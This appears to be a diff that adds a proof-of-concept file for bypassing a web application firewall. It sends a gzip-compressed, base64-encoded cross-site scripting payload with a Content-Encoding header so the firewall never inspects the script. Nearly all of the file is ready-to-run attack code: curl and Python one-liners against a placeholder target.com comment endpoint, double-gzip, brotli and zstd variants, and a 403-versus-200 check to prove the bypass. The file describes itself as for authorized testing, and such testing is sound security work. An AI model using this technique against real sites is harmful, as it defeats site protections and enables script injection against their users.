@@ -1,0 +1,33 @@
+###
+# ============================================================================
+# Safe PoC -> x8bitranjit
+# Content-Encoding (gzip) body WAF bypass. Authorized testing only.
+#
+# WHY IT WORKS: many WAFs scan only uncompressed bodies; the app (or its
+# framework) decompresses AFTER inspection - the payload never exists in
+# scanned bytes.
+#
+# WHAT TO EDIT: target.com + endpoint. The GZIP-B64 line below is a REAL
+# gzip of: {"comment":"<img src=x onerror=alert(document.domain)>"}
+# ============================================================================
+
+### 1) curl one-shot (paste the base64 into GZB64 then run)
+#   GZB64='H4sIAErUwmoC/6tWSs7PzU3NK1GyUipOTEtV0kESsMnMTVcoLkq2rVDIz0stKsovsk3MSS0q0UjJTy4FqdFLyc9NzMzTtFOqBQC6OOOKSQAAAA=='
+#   echo $GZB64 | base64 -d | curl -s -X POST https://target.com/api/comment \
+#     -H 'Content-Type: application/json' -H 'Content-Encoding: gzip' \
+#     --data-binary @- | head -c 400
+
+### 2) python one-liner variant
+#   python3 -c "import gzip,base64,urllib.request as u; d=base64.b64decode('GZB64'); r=u.Request('https://target.com/api/comment', data=d, headers={'Content-Type':'application/json','Content-Encoding':'gzip'}); print(u.urlopen(r).read()[:400])"
+
+### 3) double-gzip (when single-gzip is decoded by the WAF)
+#   gzip twice before sending; keep Content-Encoding: gzip
+
+### 4) brotli/zstd variants (edge supports, WAF does not decode)
+#   -H 'Content-Encoding: br'   /   -H 'Content-Encoding: zstd'
+
+### 5) benchmark the differential (same payload, plain vs gzip)
+#   plain POST -> 403 (rule 942100)   |  gzip POST -> 200 = bypass proven
+
+# GZB64 value (copy into the commands above):
+# H4sIAErUwmoC/6tWSs7PzU3NK1GyUipOTEtV0kESsMnMTVcoLkq2rVDIz0stKsovsk3MSS0q0UjJTy4FqdFLyc9NzMzTtFOqBQC6OOOKSQAAAA==
